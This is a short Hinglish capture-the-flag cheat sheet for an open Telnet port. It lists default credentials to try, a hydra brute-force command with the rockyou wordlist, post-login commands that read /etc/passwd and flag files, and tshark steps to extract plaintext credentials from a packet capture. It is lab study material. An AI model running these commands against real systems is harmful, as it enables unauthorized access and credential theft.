# 🔓 TELNET PORT OPEN (23) — Ab Kya?

---

## CASE 1: Direct Connect — Default Creds
```bash
telnet <IP>
# Try: msfadmin:msfadmin, root:root, admin:admin
```

---

## CASE 2: Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> telnet -t 4
```

---

## CASE 3: Login Hua — Flag Dhundo
```bash
whoami
cat /etc/passwd
cat /root/flag.txt
find / -name "flag*" 2>/dev/null
```

---

## CASE 4: Sniff Telnet Credentials (PCAP diya hai)
```bash
# Telnet plaintext hai — wireshark mein:
# Filter: telnet
# Right-click → Follow TCP Stream → creds dikhenge
tshark -r capture.pcap -z follow,tcp,ascii,0 -q
```

---

## KEY POINT:
> Telnet = **plaintext** protocol. Creds sniff ho sakte hain.
> Agar PCAP diya hai + telnet traffic → Follow TCP Stream = instant creds

---

## QUICK DECISION:
```
Telnet open
  ├─ Default creds: msfadmin, root, admin
  ├─ Brute force: hydra
  ├─ PCAP analysis? → Follow TCP Stream → plaintext creds
  └─ Login hua → cat /root/flag.txt
```
